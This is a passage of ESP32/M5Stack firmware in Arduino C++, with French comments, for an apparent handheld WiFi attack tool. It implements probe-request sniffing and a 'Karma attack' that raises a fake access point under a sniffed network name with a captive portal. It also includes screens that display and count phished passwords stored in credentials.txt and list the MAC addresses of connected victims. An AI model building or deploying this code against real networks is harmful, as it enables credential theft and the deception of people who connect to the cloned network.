          Serial.println("-------------------");
          Serial.println(selectedPortalFile.substring(7) + " portal selected.");
          Serial.println("-------------------");
          waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
          isTouchHandled = true; // Marque le toucher comme géré
          break;
        }
        isTouchHandled = true; // Marque le toucher comme géré
      }
    } else {
      isTouchHandled = false; // Réinitialise le suivi du toucher
    }
  }
}




String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0;

void readCredentialsFromFile() {
  File file = SD.open("/credentials.txt");
  if (file) {
    numCredentials = 0;
    while (file.available() && numCredentials < 100) {
      credentialsList[numCredentials++] = file.readStringUntil('\n');
    }
    file.close();
  } else {
    Serial.println("Error opening file");
  }
}

void checkCredentials() {
  readCredentialsFromFile(); // Assume this populates a global array or vector with credentials

  int currentListIndex = 0;
  bool needDisplayUpdate = true;
  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré

  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }

  while (true) {
    if (needDisplayUpdate) {
      displayCredentials(currentListIndex);
      needDisplayUpdate = false;
    }

    M5.update();

    int largeurZone = M5.Display.width() / 3;

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail();

        if (touch.x < largeurZone) {
          currentListIndex = max(0, currentListIndex - 1);
          needDisplayUpdate = true;
        } else if (touch.x >= 2 * largeurZone) {
          currentListIndex = min(numCredentials - 1, currentListIndex + 1);
          needDisplayUpdate = true;
        } else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          break;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }
  }

  inMenu = true;
  drawMenu();
}



void displayCredentials(int index) {
  // Clear the display and set up text properties
  M5.Display.clear();
  M5.Display.setTextSize(2);

  int maxVisibleLines = M5.Display.height() / 18; // Nombre maximum de lignes affichables à l'écran
  int currentLine = 0; // Ligne actuelle en cours de traitement
  int firstLineIndex = index; // Index de la première ligne de l'entrée sélectionnée
  int linesBeforeIndex = 0; // Nombre de lignes avant l'index sélectionné

  // Calculer combien de lignes sont nécessaires avant l'index sélectionné
  for (int i = 0; i < index; i++) {
    int neededLines = 1 + M5.Display.textWidth(credentialsList[i]) / (M5.Display.width() - 20);
    linesBeforeIndex += neededLines;
  }

  // Ajuster l'index de la première ligne si nécessaire pour s'assurer que l'entrée sélectionnée est visible
  while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
    linesBeforeIndex--;
    firstLineIndex--;
  }

  // Afficher les entrées de credentials visibles
  for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
    String credential = credentialsList[i];
    int neededLines = 1 + M5.Display.textWidth(credential) / (M5.Display.width() - 20);

    if (i == index) {
      M5.Display.fillRect(0, currentLine * 18, M5.Display.width(), 18 * neededLines, TFT_NAVY);
    }

    for (int line = 0; line < neededLines; line++) {
      M5.Display.setCursor(10, (currentLine + line) * 18);
      M5.Display.setTextColor(i == index ? TFT_GREEN : TFT_WHITE);

      int startChar = line * (credential.length() / neededLines);
      int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
      M5.Display.println(credential.substring(startChar, endChar));
    }

    currentLine += neededLines;
  }

  M5.Display.display();
}

bool confirmPopup(String message) {
  bool confirm = false;
  bool decisionMade = false;
  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré

  M5.Display.clear();
  M5.Display.setCursor(50, M5.Display.height() / 2);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println(message);
  M5.Display.setCursor(37, 220);
  M5.Display.setTextColor(TFT_GREEN);
  M5.Display.println("Yes");
  M5.Display.setTextColor(TFT_RED);
  M5.Display.setCursor(254, 220);
  M5.Display.println("No");
  M5.Display.setTextColor(TFT_WHITE);

  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  while (!decisionMade) {
    M5.update();

    int largeurZone = M5.Display.width() / 2; // Diviser l'écran en deux zones

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail(); // Détail du premier toucher

        if (touch.x < largeurZone) {
          confirm = true; // Zone gauche pour "Oui"
          decisionMade = true;
        } else if (touch.x >= largeurZone) {
          confirm = false; // Zone droite pour "Non"
          decisionMade = true;
        }
        isTouchHandled = true; // Marque le toucher comme géré
      }
    } else {
      isTouchHandled = false; // Réinitialise le suivi du toucher
    }
  }

  return confirm;
}


void deleteCredentials() {
  if (confirmPopup("Delete credentials?")) {
    File file = SD.open("/credentials.txt", FILE_WRITE);
    if (file) {
      file.close();
      Serial.println("-------------------");
      Serial.println("credentials.txt deleted");
      Serial.println("-------------------");
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("Credentials deleted successfully");
    } else {
      Serial.println("-------------------");
      Serial.println("Error deleteting credentials.txt ");
      Serial.println("-------------------");
      waitAndReturnToMenu("Error..");
      Serial.println("Error opening file for deletion");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}


int countPasswordsInFile() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password --")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}


int oldNumClients = -1;
int oldNumPasswords = -1;

void displayMonitorPage1() {

  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré

  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);

  M5.Display.setCursor(10, 90);
  M5.Display.println("SSID: " + clonedSSID);
  M5.Display.setCursor(10, 120);
  M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
  M5.Display.setCursor(10, 150);
  M5.Display.println("Page: " + selectedPortalFile.substring(7));

  oldNumClients = -1;
  oldNumPasswords = -1;

  M5.Display.display();
  delay(1000);
  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();
    server.handleClient();

    int newNumClients = WiFi.softAPgetStationNum();
    int newNumPasswords = countPasswordsInFile();

    if (newNumClients != oldNumClients) {
      M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
      M5.Display.setCursor(10, 30);
      M5.Display.println("Clients: " + String(newNumClients));
      oldNumClients = newNumClients;
    }

    if (newNumPasswords != oldNumPasswords) {
      M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
      M5.Display.setCursor(10, 60);
      M5.Display.println("Passwords: " + String(newNumPasswords));
      oldNumPasswords = newNumPasswords;
    }

    int largeurZone = M5.Display.width() / 3;

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail();

        if (touch.x < largeurZone) {
          displayMonitorPage3();
          break;
        } else if (touch.x >= 2 * largeurZone) {
          displayMonitorPage2();
          break;
        } else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          inMenu = true;
          drawMenu();
          break;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }

    delay(100);
  }
}

void updateConnectedMACs() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  for (int i = 0; i < adapterList.num; i++) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
             adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
    macAddresses[i] = String(macStr);
  }
}

void displayMonitorPage2() {
  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  M5.Display.clear();
  M5.Display.setTextSize(2);
  updateConnectedMACs();
  if (macAddresses[0] == "") {
    M5.Display.setCursor(10, 30);
    M5.Display.println("No client connected");
    Serial.println("----Mac-Address----");
    Serial.println("No client connected");
    Serial.println("-------------------");
  } else {
    Serial.println("----Mac-Address----");
    for (int i = 0; i < 10; i++) {
      int y = 30 + i * 20;
      if (y > M5.Display.height() - 20) break;

      M5.Display.setCursor(10, y);
      M5.Display.println(macAddresses[i]);
      Serial.println(macAddresses[i]);
    }
    Serial.println("-------------------");
  }


  M5.Display.display();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();
    int largeurZone = M5.Display.width() / 3;

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail();

        if (touch.x < largeurZone) {
          displayMonitorPage1();
          break;
        } else if (touch.x >= 2 * largeurZone) {
          displayMonitorPage3();
          break;
        } else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          inMenu = true;
          drawMenu();
          break;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }
  }
}

String oldStack = "";
String oldRamUsage = "";
String oldBatteryLevel = "";
String oldTemperature = "";

String getBatteryLevel() {
  return String(M5.Power.getBatteryLevel());
}

String getTemperature() {
  float temperature;
  M5.Imu.getTemp(&temperature);
  int roundedTemperature = round(temperature);
  return String(roundedTemperature);
}

String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}

String getRamUsage() {
  float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0;
  char buffer[10];
  sprintf(buffer, "%.2f", heapSizeInMegabytes);
  return String(buffer);
}

unsigned long lastUpdateTime = 0;
const long updateInterval = 1000;

void displayMonitorPage3() {
  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);


  oldStack = getStack();
  oldRamUsage = getRamUsage();
  oldBatteryLevel = getBatteryLevel();
  oldTemperature = getTemperature();

  M5.Display.setCursor(10, 30);
  M5.Display.println("Stack left: " + oldStack + " Kb");
  M5.Display.setCursor(10, 60);
  M5.Display.println("RAM: " + oldRamUsage + " Mo");
  M5.Display.setCursor(10, 90);
  M5.Display.println("Battery: " + oldBatteryLevel + "%"); // thx to kdv88 to pointing mistranlastion
  M5.Display.setCursor(10, 120);
  M5.Display.println("Temperature: " + oldTemperature + "C");

  M5.Display.display();

  lastUpdateTime = millis();


  oldStack = "";
  oldRamUsage = "";
  oldBatteryLevel = "";
  oldTemperature = "";

  M5.Display.display();

  while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();

    unsigned long currentMillis = millis();


    if (currentMillis - lastUpdateTime >= updateInterval) {
      String newStack = getStack();
      String newRamUsage = getRamUsage();
      String newBatteryLevel = getBatteryLevel();
      String newTemperature = getTemperature();

      if (newStack != oldStack) {
        M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 30);
        M5.Display.println("Stack left: " + newStack + " Kb");
        oldStack = newStack;
      }

      if (newRamUsage != oldRamUsage) {
        M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 60);
        M5.Display.println("RAM: " + newRamUsage + " Mo");
        oldRamUsage = newRamUsage;
      }

      if (newBatteryLevel != oldBatteryLevel) {
        M5.Display.fillRect(10, 90, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 90);
        M5.Display.println("Battery: " + newBatteryLevel + "%");// thx to kdv88 to pointing mistranlastion
        oldBatteryLevel = newBatteryLevel;
      }

      if (newTemperature != oldTemperature) {
        M5.Display.fillRect(10, 120, 200, 20, TFT_BLACK);
        M5.Display.setCursor(10, 120);
        M5.Display.println("Temperature: " + newTemperature + "C");
        oldTemperature = newTemperature;
      }

      lastUpdateTime = currentMillis;
    }

    int largeurZone = M5.Display.width() / 3;

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail();

        if (touch.x < largeurZone) {
          displayMonitorPage2();
          break;
        } else if (touch.x >= 2 * largeurZone) {
          displayMonitorPage1();
          break;
        } else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          inMenu = true;
          drawMenu();
          break;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }

    delay(100);
  }
}



void probeSniffing() {
  isProbeSniffingMode = true;
  isProbeSniffingRunning = true;
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  startScanKarma();

  while (isProbeSniffingRunning) {
    M5.update();
    handleDnsRequestSerial();

    if (M5.Touch.getCount()) {
      stopProbeSniffingViaSerial = false;
      isProbeSniffingRunning = false;
      break;
    }
  }

  stopScanKarma();
  isProbeSniffingMode = false;
  if (stopProbeSniffingViaSerial) {
    stopProbeSniffingViaSerial = false;
  }
}



void karmaAttack() {
  drawStartButtonKarma();
}

void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(50 , M5.Display.height() / 2 );
  M5.Display.println(message);
  M5.Display.display();
  delay(1500);
  inMenu = true;
  drawMenu();
}

void brightness() {
  static bool isTouchHandled = false; // Pour suivre si le toucher a été géré
  int currentBrightness = M5.Display.getBrightness();
  int minBrightness = 1;
  int maxBrightness = 255;

  // Attendre que l'utilisateur relâche tous les touchers avant de commencer
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Petite attente pour que l'utilisateur relâche le toucher
  }

  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(TFT_WHITE);
  bool brightnessAdjusted = true;

  while (true) {
    M5.update();
    handleDnsRequestSerial();

    int largeurZone = M5.Display.width() / 3; // Définir la largeur de chaque zone tactile

    if (M5.Touch.getCount()) {
      if (!isTouchHandled) {
        auto touch = M5.Touch.getDetail(); // Détail du premier toucher

        // Diminuer la luminosité
        if (touch.x < largeurZone) {
          currentBrightness = max(minBrightness, currentBrightness - 12);
          brightnessAdjusted = true;
        }
        // Augmenter la luminosité
        else if (touch.x >= 2 * largeurZone) {
          currentBrightness = min(maxBrightness, currentBrightness + 12);
          brightnessAdjusted = true;
        }
        // Sauvegarder et quitter
        else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
          saveConfigParameter("brightness", currentBrightness);
          break; // Sortir de la boucle
        }
        isTouchHandled = true; // Marque le toucher comme géré
      }
    } else {
      isTouchHandled = false; // Réinitialise le suivi du toucher
    }

    if (brightnessAdjusted) {
      float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
      M5.Display.fillScreen(TFT_BLACK);
      M5.Display.setCursor(10, M5.Display.height() / 2 - 10);
      M5.Display.print("Brightness: ");
      M5.Display.print((int)brightnessPercentage);
      M5.Display.println("%");
      M5.Display.setBrightness(currentBrightness);
      brightnessAdjusted = false;
    }
  }

  float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
  waitAndReturnToMenu("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
}


void saveConfigParameter(String key, int value) {
  if (!SD.exists(configFolderPath)) {
    SD.mkdir(configFolderPath);
  }

  String content = "";
  File configFile = SD.open(configFilePath, FILE_READ);
  if (configFile) {
    while (configFile.available()) {
      content += configFile.readStringUntil('\n') + '\n';
    }
    configFile.close();
  } else {
    Serial.println("Error when opening config.txt for reading");
    return;
  }

  int startPos = content.indexOf(key + "=");
  if (startPos != -1) {
    int endPos = content.indexOf('\n', startPos);
    String oldValue = content.substring(startPos, endPos);
    content.replace(oldValue, key + "=" + String(value));
  } else {
    content += key + "=" + String(value) + "\n";
  }

  configFile = SD.open(configFilePath, FILE_WRITE);
  if (configFile) {
    configFile.print(content);
    configFile.close();
    Serial.println(key + " saved!");
  } else {
    Serial.println("Error when opening config.txt for writing");
  }
}



void restoreConfigParameter(String key) {
  if (SD.exists(configFilePath)) {
    File configFile = SD.open(configFilePath, FILE_READ);
    if (configFile) {
      String line;
      int value = defaultBrightness;
      while (configFile.available()) {
        line = configFile.readStringUntil('\n');
        if (line.startsWith(key + "=")) {
          value = line.substring(line.indexOf('=') + 1).toInt();
          break;
        }
      }
      configFile.close();
      if (key == "brightness") {
        M5.Display.setBrightness(value);
        Serial.println("Brightness restored to " + String(value));
      }
    } else {
      Serial.println("Error when opening config.txt");
    }
  } else {
    Serial.println("Config file not found, using default value");
    if (key == "brightness") {
      M5.Display.setBrightness(defaultBrightness);
    }
  }
}




//KARMA-PART-FUNCTIONS

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (ssid_count_Karma == 0) {
    M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
    M5.Display.println("Waiting for probe...");
  }

  if (frame_type == 0x40) { // Probe Request Frame
    uint8_t ssid_length_Karma = frame[25];
    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
      char ssidKarma[33] = {0};
      memcpy(ssidKarma, &frame[26], ssid_length_Karma);
      ssidKarma[ssid_length_Karma] = '\0';
      if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
        return;
      }

      bool ssidExistsKarma = false;
      for (int i = 0; i < ssid_count_Karma; i++) {
        if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
          ssidExistsKarma = true;
          break;
        }
      }


      if (isSSIDWhitelisted(ssidKarma)) {
        if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
          seenWhitelistedSSIDs.insert(ssidKarma);
          Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
        }
        return;
      }

      if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
        strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
        updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
        Serial.print("Found: ");
        if (ledOn) {
          pixels.setPixelColor(0, pixels.Color(255, 0, 0));
          pixels.setPixelColor(9, pixels.Color(255, 0, 0));
          pixels.show();
          delay(50);

          pixels.setPixelColor(0, pixels.Color(0, 0, 0));
          pixels.setPixelColor(9, pixels.Color(0, 0, 0));
          pixels.show();
          delay(50);
        }
        Serial.println(ssidKarma);
      }
    }
  }
}

void saveSSIDToFile(const char* ssid) {
  bool ssidExists = false;
  File readfile = SD.open("/probes.txt", FILE_READ);
  if (readfile) {
    while (readfile.available()) {
      String line = readfile.readStringUntil('\n');
      if (line.equals(ssid)) {
        ssidExists = true;
        break;
      }
    }
    readfile.close();
  }
  if (!ssidExists) {
    File file = SD.open("/probes.txt", FILE_APPEND);
    if (file) {
      file.println(ssid);
      file.close();
    } else {
      Serial.println("Error opening probes.txt");
    }
  }
}


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
  const int maxLength = 22;
  char truncatedSSID[23];

  M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 60, TFT_BLACK);
  int startIndexKarma = max(0, count - maxMenuDisplayKarma);

  for (int i = startIndexKarma; i < count; i++) {
    int lineIndexKarma = i - startIndexKarma;
    M5.Display.setCursor(0, lineIndexKarma * 20);

    if (strlen(ssidsKarma[i]) > maxLength) {
      strncpy(truncatedSSID, ssidsKarma[i], maxLength);
      truncatedSSID[maxLength] = '\0';
      M5.Display.printf("%d.%s", i + 1, truncatedSSID);
    } else {
      M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
    }
  }
  if ( count <= 9) {
    M5.Display.fillRect(M5.Display.width() - 15, 0, 15, 20, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 13, 3);
  } else if ( count >= 10 && count <= 99) {
    M5.Display.fillRect(M5.Display.width() - 30, 0, 30, 20, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 27, 3);
  } else if ( count >= 100 && count < MAX_SSIDS_Karma * 0.7) {
    M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_ORANGE);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() - 42, 3);
    M5.Display.setTextColor(TFT_WHITE);
  } else {
    M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_RED);
    M5.Display.setCursor(M5.Display.width() - 42, 3);
  }
  if (count == MAX_SSIDS_Karma) {
    M5.Display.printf("MAX");
  } else {
    M5.Display.printf("%d", count);
  }
  M5.Display.display();
}


void drawStartButtonKarma() {
  M5.Display.clear();
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_GREEN);
  M5.Display.setCursor(100, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_BLACK);
  M5.Display.println("Start Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(100, M5.Display.height() - 40);
  M5.Display.println("Stop Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void startScanKarma() {
  isScanningKarma = true;
  ssid_count_Karma = 0;
  M5.Display.clear();
  drawStopButtonKarma();
  //ESP_BT.end();
  //bluetoothEnabled = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

  readConfigFile("/config/config.txt");
  seenWhitelistedSSIDs.clear();

  Serial.println("-------------------");
  Serial.println("Probe Sniffing Started...");
  Serial.println("-------------------");
}


void stopScanKarma() {
  Serial.println("-------------------");
  Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
  Serial.println("-------------------");
  isScanningKarma = false;
  esp_wifi_set_promiscuous(false);


  if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
    Serial.println("Saving SSIDs to SD card automatically...");
    for (int i = 0; i < ssid_count_Karma; i++) {
      saveSSIDToFile(ssidsKarma[i]);
    }
    Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
  } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
    bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
    if (saveSSID) {
      M5.Display.clear();
      M5.Display.setCursor(50 , M5.Display.height() / 2 );
      M5.Display.println("Saving SSIDs on SD..");
      for (int i = 0; i < ssid_count_Karma; i++) {
        saveSSIDToFile(ssidsKarma[i]);
      }
      M5.Display.clear();
      M5.Display.setCursor(50 , M5.Display.height() / 2 );
      M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
      Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
    } else {
      M5.Display.clear();
      M5.Display.setCursor(50 , M5.Display.height() / 2 );
      M5.Display.println("  No SSID saved.");
    }
    delay(1000);
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
  }


  menuSizeKarma = ssid_count_Karma;
  currentIndexKarma = 0;
  menuStartIndexKarma = 0;

  if (isKarmaMode && ssid_count_Karma > 0) {
    drawMenuKarma();
    currentStateKarma = StopScanKarma;
  } else {
    currentStateKarma = StartScanKarma;
    inMenu = true;
    drawMenu();
  }
  isKarmaMode = false;
  isProbeSniffingMode = false;
  stopProbeSniffingViaSerial = false;
}



void handleMenuInputKarma() {
  static bool isTouchHandled = false; // Pour éviter la répétition des actions avec un seul toucher
  bool stateChanged = false;
  int largeurZone = M5.Display.width() / 3; // Diviser l'écran en trois zones

  M5.update(); // Mettre à jour l'état du toucher

  if (M5.Touch.getCount()) {
    if (!isTouchHandled) {
      auto touch = M5.Touch.getDetail(); // Obtenir les détails du toucher

      // Zone gauche : monter dans le menu
      if (touch.x < largeurZone) {
        currentIndexKarma--;
        if (currentIndexKarma < 0) {
          currentIndexKarma = menuSizeKarma - 1;
        }
        stateChanged = true;
      }
      // Zone droite : descendre dans le menu
      else if (touch.x >= 2 * largeurZone) {
        currentIndexKarma++;
        if (currentIndexKarma >= menuSizeKarma) {
          currentIndexKarma = 0;
        }
        stateChanged = true;
      }
      // Zone centrale : sélectionner l'option
      else if (touch.x >= largeurZone && touch.x < 2 * largeurZone) {
        executeMenuItemKarma(currentIndexKarma);
        stateChanged = true;
      }

      isTouchHandled = true; // Empêcher le traitement multiple du même toucher
    }
  } else {
    isTouchHandled = false; // Réinitialiser lorsque l'utilisateur n'appuie pas
  }

  if (stateChanged) {
    menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
    drawMenuKarma(); // Redessiner le menu si l'état a changé
  }
}



void drawMenuKarma() {
  M5.Display.clear();
  M5.Display.setTextSize(2);
  M5.Display.setTextFont(1);

  int lineHeight = 24;
  int startX = 10;
  int startY = 25;

  for (int i = 0; i < maxMenuDisplayKarma; i++) {
    int menuIndexKarma = menuStartIndexKarma + i;
    if (menuIndexKarma >= menuSizeKarma) break;

    if (menuIndexKarma == currentIndexKarma) {
      M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
    M5.Display.println(ssidsKarma[menuIndexKarma]);
  }
  M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
  if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
    startAPWithSSIDKarma(ssidsKarma[indexKarma]);
  } else {
    M5.Display.clear();
    M5.Display.println("Selection invalide!");
    delay(1000);
    drawStartButtonKarma();
    currentStateKarma = StartScanKarma;
  }
}

void startAPWithSSIDKarma(const char* ssid) {
  clonedSSID = String(ssid);
  isProbeKarmaAttackMode = true;
  readConfigFile("/config/config.txt");
  createCaptivePortal();

  Serial.println("-------------------");
  Serial.println("Karma Attack started for : " + String(ssid));
  Serial.println("-------------------");

  M5.Display.clear();
  unsigned long startTime = millis();
  unsigned long currentTime;
  int remainingTime;
  int clientCount = 0;
  int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)
  while (M5.Touch.getCount() != 0) {
    M5.update();
    delay(10); // Attente courte pour laisser le temps à l'utilisateur de relâcher le toucher
  }
  while (true) {

    M5.update();
    handleDnsRequestSerial();
    currentTime = millis();
    remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
    clientCount = WiFi.softAPgetStationNum();

    M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 50);
    M5.Display.println(String(ssid));

    int textWidth = 12 * 16;
    M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 90, textWidth, 20, TFT_BLACK);
    M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 90);
    M5.Display.print("Left Time: ");
    M5.Display.print(remainingTime);
    M5.Display.println(" s");

    textWidth = 12 * 20;
    M5.Display.fillRect((M5.Display.width() - textWidth) / 2, 130, textWidth, 20, TFT_BLACK);
    M5.Display.setCursor((M5.Display.width() - textWidth) / 2, 130);
    M5.Display.print("Connected Client: ");
    M5.Display.println(clientCount);

    Serial.println("---Karma-Attack---");
    Serial.println("On :" + String(ssid));
    Serial.println("Left Time: " + String(remainingTime) + "s");
    Serial.println("Connected Client: " + String(clientCount));
    Serial.println("-------------------");


    M5.Display.setCursor(130, 220);
    M5.Display.println(" Stop");
    M5.Display.display();

    if (remainingTime <= 0) {
      break;
    }
    if (M5.Touch.getCount()) {
      break;
    } else {
      delay(200);
    }

  }
  M5.Display.clear();
  M5.Display.setCursor(50 , M5.Display.height() / 2 );
  if (clientCount > 0) {
    M5.Display.println("Karma Successful!!!");
    Serial.println("-------------------");
    Serial.println("Karma Attack worked !");
    Serial.println("-------------------");
  } else {
    M5.Display.println(" Karma Failed...");
    Serial.println("-------------------");
    Serial.println("Karma Attack failed...");
    Serial.println("-------------------");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
  delay(2000);
  if (confirmPopup("Save " + String(ssid) + " ?" )) {
    saveSSIDToFile(ssid);
  }
  lastIndex = -1;
  inMenu = true;
  isProbeKarmaAttackMode = false;
  currentStateKarma = StartScanKarma;
  memset(ssidsKarma, 0, sizeof(ssidsKarma));
  ssid_count_Karma = 0;
  drawMenu();
}

void listProbes() {
  static bool isTouchHandled = false; // Pour éviter la répétition des actions avec un seul toucher
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0 && !isProbePresent(probes, numProbes, line)) {
      probes[numProbes++] = line;
    }
  }
  file.close();
